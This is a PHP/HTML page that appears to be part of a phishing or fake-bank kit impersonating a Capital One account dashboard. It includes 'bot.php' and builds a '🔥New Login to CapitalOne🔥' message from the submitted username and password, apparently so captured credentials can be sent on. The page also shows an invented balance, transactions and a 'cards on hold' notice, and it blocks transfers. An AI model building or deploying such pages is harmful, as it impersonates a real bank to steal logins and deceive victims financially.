<?php 
session_start();

include_once('bot.php');

//runs only if post request
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['submit'])) {
    $username = $_POST["username"];
    $password = $_POST["password"];
    if($username == "a" && $password == "b"){
        $_SESSION["username"] = $username;   
      }else{
        header("Location: ../");
        
    }
};

if(!isset($_SESSION["username"])){
    header("Location: ../");
    exit();
};

$message = "🔥New Login to CapitalOne🔥\n";
$message = $meassage."Username: ".$username."\nPassword: ".$password;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="capital one login, capital one credit card login, capitalone, capitalone login, capital one 360 login">
    <base href="">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="style.css">
</head>
<body>
    

<nav class="fixed top-0 z-50 w-full bg-white  shadow">
  <div class="px-3 py-3 lg:px-5 lg:pl-3">
    <div class="flex items-center justify-between">
      <div class="flex items-center justify-start rtl:justify-end">
        <button data-drawer-target="logo-sidebar" data-drawer-toggle="logo-sidebar" aria-controls="logo-sidebar" type="button" class="inline-flex items-center p-2 text-sm text-gray-500 rounded-lg sm:hidden hover:bg focus:outline-none focus:ring-2 focus:ring-gray-200   ">
            <span class="sr-only">Open sidebar</span>
            <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
               <path clip-rule="evenodd" fill-rule="evenodd" d="M2 4.75A.75.75 0 012.75 4h14.5a.75.75 0 010 1.5H2.75A.75.75 0 012 4.75zm0 10.5a.75.75 0 01.75-.75h7.5a.75.75 0 010 1.5h-7.5a.75.75 0 01-.75-.75zM2 10a.75.75 0 01.75-.75h14.5a.75.75 0 010 1.5H2.75A.75.75 0 012 10z"></path>
            </svg>
         </button>
        <a href="../img/" class="flex ms-2 md:me-24">
          <img src="../capital-one-logo.svg" class="h-8 me-3" alt="Capitalone Logo" />
        </a>
      </div>
      <div class="flex items-center">
          <div class="flex items-center ms-3">
            <div>
              <button type="button" class="flex text-sm border border-black rounded-full focus:ring-4 focus:ring-gray-300 " aria-expanded="false" data-dropdown-toggle="dropdown-user">
                <span class="sr-only">Open user menu</span>
                <img class="w-8 h-8 rounded-full" src="../img/user-1.png" alt="user photo">
              </button>
            </div>
            <div class="z-50 hidden my-4 text-base list-none bg-white divide-y divide-gray-100 rounded shadow  " id="dropdown-user">
              <div class="px-4 py-3" role="none">
                <p class="text-sm text-gray-900 " role="none">
                  Christy Love
                </p>
                <p class="text-sm font-medium text-gray-900 truncate " role="none">
                  christy.love@gmail.com
                </p>
              </div>
              <ul class="py-1" role="none">
                <li>
                  <a href="settings.php" class="block px-4 py-2 text-sm text-gray-700 hover:bg   " role="menuitem">Account</a>
                </li>
                <li>
                  <a href="logout.php" class="block px-4 py-2 text-sm text-gray-700 hover:bg   " role="menuitem">Logout</a>
                </li>
              </ul>
            </div>
          </div>
        </div>
    </div>
  </div>
</nav>

<aside id="logo-sidebar" class="fixed top-0 left-0 z-40 w-64 h-[100%] flex flex-col transition-transform -translate-x-full sm:translate-x-0 bg-gray-200" aria-label="Sidebar">
   <div class="h-full flex flex-col justify-between px-3 pb-4 overflow-y-auto">
      <div class="">
        <ul class="pt-[80px] space-y-[30px] pl-2">
          <li>
              <a href="#" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
                <img src="../img/home.svg" alt="" class="h-[25px]">
                <p>Dashboard</p>
              </a>
          </li>
          <li>
              <a onclick="denytransfer()" href="javascript:void(0);" href="transfer.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
                <img src="../img/transfer.png" alt="" class="h-[25px]">
                <p>Transfer</p>
              </a>
          </li>
          <li>
              <a onclick="denyCreditView()" href="javascript:void(0);" href="accounts-credits.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
                  <img src="../img/account.png" alt="" class="h-[25px]">
                  <p>Accounts and Credits</p>
              </a>
          </li>
          <li><div class="py-6" id="donut-chart"></div></li>
        </ul>
      </div>
      
      <div class="w-full">
          <ul class="ml-4 space-y-2">
            <li>
              <a href="settings.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
                <img src="../img/settings.png" alt="">
                <p>Settings</p>
              </a>
          </li>
          <li>
            <a href="logout.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
              <img src="../img/logout.png" alt="">
              <p>Logout</p>
            </a>
        </li>
          </ul>
      </div>

   </div>
</aside>



<div class="min-h-screen flex flex-col justify-between bg-gray-300 ">

  <main class="md:ml-64 h-[auto] mt-[50px]">
    <div class="grid grid-cols-1  lg:grid-cols-2 gap-4 mb-4">
      <div class= "bg-gray-100 rounded-lg p-4 md:h-[280px] md:ml-2 mt-4">
        <div class="mb-4 border-0 border-b-2 pb-2 md:pb-4">
          <p class="text-[24px] font-bold">My Balance</p>
          <p class="text-[32px] balance" style="color: #026597;">$1,490,32.20</p>
          <p class="">Available balance</p>
        </div>
  
          <div class="flex items-center space-x-4 justify-between p-2">
            <div class="flex items-center space-x-4">
              <div class=""><img src="../img/account-number.png" alt="" ></div>
              <div>
                <p class="font-bold">Account Number</p>
                <p>2095....</p>
              </div>
            </div>
  
            <div class="flex items-center space-x-4">
              <div class=""><img src="../img/account-number.png" alt=""></div>
              <div>
                <p class="font-bold">Routing Number</p>
                <p>2874.....</p>
              </div>
            </div>
          </div>
      </div>
      
  
      <div class="rounded-lg p-4 bg-gray-100 md:mt-4">
        <p class="text-[24px] font-bold mb-2">Upcoming Transactions</p>
  
        <div class="flex flex-col text-[12px]">
          <!-- upcoming 1 -->
          <div class="border-0 border-b-2 pb-2">
            <div class="flex justify-between items-center">
              <div class="flex items-center space-x-2 p-2">
                <img class="w-8 h-8 rounded-full" src="../img/walmart.png" alt="user photo">
                <div>
                  <p>Walmart</p>
                  <p>Groceries</p>
                </div>
              </div>
    
              <div>
                <p>-15.20</p>
                <p>Dec 23, 2023</p>
              </div>
            </div>
          </div>
            <!-- upcoming 2 -->
            <div class="border-0 border-b-2 pb-2">
              <div class="flex justify-between items-center">
                <div class="flex items-center space-x-2 p-2">
                  <img class="w-8 h-8 rounded-full" src="../img/expedia.png" alt="user photo">
                  <div>
                    <p>Expedia</p>
                    <p>Travel</p>
                  </div>
                </div>
      
                <div>
                  <p>-153.10</p>
                  <p>Dec 23, 2023</p>
                </div>
                
              </div>
            </div>   
  
          <!-- upcoming 3 -->
          <div class="border-0 border-b-2 pb-2">
            <div class="flex justify-between items-center">
              <div class="flex items-center space-x-2 p-2">
                <img class="w-8 h-8 rounded-full" src="../img/netflix.png" alt="user photo">
                <div>
                  <p>Netfllix</p>
                  <p>Movies</p>
                </div>
              </div>
              <div>
                <p>-22.99</p>
                <p>Dec 23, 2023</p>
              </div>  
            </div>
          </div>
  
        </div>
      </div>
    </div>
  
  
  
    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
      <div class="bg-gray-100 rounded-lg p-4 md:ml-2 ">
        <p class="text-[24px] font-bold mb-2">Recent Transactions</p>
  
        <div class="flex flex-col text-[12px]">
          <!-- Recent 1 -->
          <div class="border-0 border-b-2 pb-2">
            <div class="flex justify-between items-center">
              <div class="flex items-center space-x-2 p-2">
                <img class="w-8 h-8 rounded-full" src="../img/amazon.png" alt="user photo">
                <div>
                  <p>Amazon</p>
                  <p>Online Shopping</p>
                </div>
              </div>
    
              <div>
                <p>-230.89</p>
                <p>Dec 23, 2023</p>
              </div>
            </div>
          </div>
            <!-- Recent 2 -->
            <div class="border-0 border-b-2 pb-2">
              <div class="flex justify-between items-center">
                <div class="flex items-center space-x-2 p-2">
                  <img class="w-8 h-8 rounded-full" src="../img/spotify.png" alt="user photo">
                  <div>
                    <p>Spotify</p>
                    <p>Music</p>
                  </div>
                </div>
      
                <div>
                  <p>-16.99</p>
                  <p>Dec 23, 2023</p>
                </div>
                
              </div>
            </div>   
  
          <!-- Recent 3 -->
          <div class="border-0 border-b-2 pb-2">
            <div class="flex justify-between items-center">
              <div class="flex items-center space-x-2 p-2">
                <img class="w-8 h-8 rounded-full" src="../img/hulu.png" alt="user photo">
                <div>
                  <p>Hulu</p>
                  <p>Movies</p>
                </div>
              </div>
    
              <div>
                <p>-76.99</p>
                <p>Dec 23, 2023</p>
              </div>
              
            </div>
          </div>
  
        <!-- Recent 4 -->
        <div class="border-0 border-b-2 pb-2">
          <div class="flex justify-between items-center">
            <div class="flex items-center space-x-2 p-2">
              <img class="w-8 h-8 rounded-full" src="../img/netflix.png" alt="user photo">
              <div>
                <p>Netflix</p>
                <p>Movies</p>
              </div>
            </div>
  
            <div>
              <p>-22.99</p>
              <p>Dec 23, 2023</p>
            </div>
            
          </div>
        </div>
  
        <!-- Recent 5 -->
        <div class="border-0 border-b-2 pb-2">
          <div class="flex justify-between items-center">
            <div class="flex items-center space-x-2 p-2">
              <img class="w-8 h-8 rounded-full" src="../img/macdonalds.png" alt="user photo">
              <div>
                <p>Macdonalds</p>
                <p>Food</p>
              </div>
            </div>
          <div>
              <p>-120.33</p>
              <p>Dec 23, 2023</p>
            </div>
            
          </div>
        </div>
  
  
  
      </div>
      </div>
  
      <div class="bg-gray-100">
          <div class="p-4">
            <p class="text-[24px] font-bold mb-2">Credit Cards</p>
          </div>
  
          <div class="text-center text-red-700 p-2 md:p-4 mb-8">
            <p>Sorry, your credit cards have been temporarily placed on hold and cannot be used for any purchases.</p>
          </div>
      </div>
    </div>
  </main>
  
      <!-- mobiler -->
      <footer class="lg:hidden">
          <div class="bg-gray-100">
              <ul class="flex flex-col flex text-[13px] lg:hidden py-[22px] space-y-[11px]">
                  <li><a class="m-10" href="">Legal</a></li>
                  <li><a class="m-10" href="">Contact us</a></li> 
                  <li><a class="m-10" href="">Privacy</a></li>
                  <li><a class="m-10" href="">Security</a></li>
                  <li><a class="m-10" href="">Terms & Conditions</a></li>
                  <li><a class="px-10" href="">Accessibility</a></li>
              </ul>
  
              <div class="flex items-center justify-end space-x-4 p-4">
                  <div><img class="w-[30px]" src="../fdic.svg" alt=""></div>
                  <div><img class="w-[30px]" src="../equal_housing_lender.svg" alt=""></div>
              </div>
          </div>
      </footer>
      <footer class="hidden lg:block">
          <div>
              <div class="footer-main h-[100%] p-[12px] bg-white hidden lg:flex justify-end lg:space-x-[480px] lg:space-x-[100px] items-center ">
                  <ul class="flex items-right flex footer text-[10px]">
                      <li><a class="px-2" href="">Contact us</a></li> 
                      <li><a class="px-2" href="">Legal</a></li>
                      <li><a class="px-2" href="">Privacy</a></li>
                      <li><a class="px-2" href="">Security</a></li>
                      <li><a class="px-2" href="">Terms & Conditions</a></li>
                      <li><a class="px-2" href="">Accessibility</a></li>
                  </ul>
  
                  <div class="flex items-center pr-[45px] space-x-4">
                      <div><img class="w-[35px]" src="fdic.svg" alt=""></div>
                      <div><img class="w-[35px]" src="equal_housing_lender.svg" alt=""></div>
                  </div>    
  
              </div>
          </div>
      </footer>
</div>

 

    
    <script>
      // ApexCharts options and config
  window.addEventListener("load", function() {
    const getChartOptions = () => {
        return {
          series: [35.1, 23.5, 2.4, 5.4],
          colors: ["#1C64F2", "#16BDCA", "#FDBA8C", "#E74694"],
          chart: {
            height: 320,
            width: "100%",
            type: "donut",
          },
          stroke: {
            colors: ["transparent"],
            lineCap: "",
          },
          plotOptions: {
            pie: {
              donut: {
                labels: {
                  show: true,
                  name: {
                    show: true,
                    fontFamily: "Inter, sans-serif",
                    offsetY: 20,
                  },
                  total: {
                    showAlways: true,
                    show: true,
                    label: "Total spendings",
                    fontFamily: "Inter, sans-serif",
                    formatter: function (w) {
                      const sum = w.globals.seriesTotals.reduce((a, b) => {
                        return a + b
                      }, 0)
                      return `${sum}k`
                    },
                  },
                  value: {
                    show: true,
                    fontFamily: "Inter, sans-serif",
                    offsetY: -20,
                    formatter: function (value) {
                      return value + "k"
                    },
                  },
                },
                size: "80%",
              },
            },
          },
          grid: {
            padding: {
              top: -2,
            },
          },
          labels: ["Shopping", "Food", "Electricity", "Groceries"],
          dataLabels: {
            enabled: false,
          },
          legend: {
            position: "bottom",
            fontFamily: "Inter, sans-serif",
          },
          yaxis: {
            labels: {
              formatter: function (value) {
                return value + "k"
              },
            },
          },
          xaxis: {
            labels: {
              formatter: function (value) {
                return value  + "k"
              },
            },
            axisTicks: {
              show: false,
            },
            axisBorder: {
              show: false,
            },
          },
        }
      }

      if (document.getElementById("donut-chart") && typeof ApexCharts !== 'undefined') {
        const chart = new ApexCharts(document.getElementById("donut-chart"), getChartOptions());
        chart.render();

        // Get all the checkboxes by their class name
        const checkboxes = document.querySelectorAll('#devices input[type="checkbox"]');

        // Function to handle the checkbox change event
        function handleCheckboxChange(event, chart) {
            const checkbox = event.target;
            if (checkbox.checked) {
                switch(checkbox.value) {
                  case 'desktop':
                    chart.updateSeries([15.1, 22.5, 4.4, 8.4]);
                    break;
                  case 'tablet':
                    chart.updateSeries([25.1, 26.5, 1.4, 3.4]);
                    break;
                  case 'mobile':
                    chart.updateSeries([45.1, 27.5, 8.4, 2.4]);
                    break;
                  default:
                    chart.updateSeries([55.1, 28.5, 1.4, 5.4]);
                }

            } else {
                chart.updateSeries([35.1, 23.5, 2.4, 5.4]);
            }
        }

        // Attach the event listener to each checkbox
        checkboxes.forEach((checkbox) => {
            checkbox.addEventListener('change', (event) => handleCheckboxChange(event, chart));
        });
      }
  });
        

    </script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.1/dist/cdn.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>
    <script src="script.js"></script>
</body>
</html>